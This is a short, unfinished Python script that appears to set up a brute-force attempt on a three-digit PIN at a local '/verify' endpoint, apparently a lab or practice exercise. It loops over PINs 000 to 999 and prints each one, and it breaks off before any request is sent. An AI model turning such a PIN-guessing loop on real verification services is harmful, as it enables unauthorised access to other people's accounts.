import requests
import time

url = 'http://localhost:8888/verify'

for pin in range(1000):
    pin_str = str(pin).zfill(3)
    print(f"Trying PIN: {pin_str}")

  
